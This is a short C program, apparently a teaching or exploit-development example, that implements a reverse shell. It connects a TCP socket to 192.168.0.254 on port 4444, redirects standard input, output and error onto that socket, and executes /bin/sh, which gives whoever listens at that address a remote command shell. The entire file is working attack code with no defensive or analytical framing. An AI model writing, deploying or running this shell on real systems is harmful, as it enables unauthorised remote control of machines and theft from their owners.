#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main() {

	int sockfd; 		// socket file descriptor
	socklen_t socklen; 	// socket-length for new connection
	struct sockaddr_in addr;	// client address
	
	// init sockaddr struct connect to
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	addr.sin_addr.s_addr = inet_addr("192.168.0.254");

 	// create new TCP socket
	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

	// connect socket
	connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	// duplicate file descriptors
	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	// execute /bin/sh
	execve("/bin/sh", NULL, NULL);

	return 0;
}
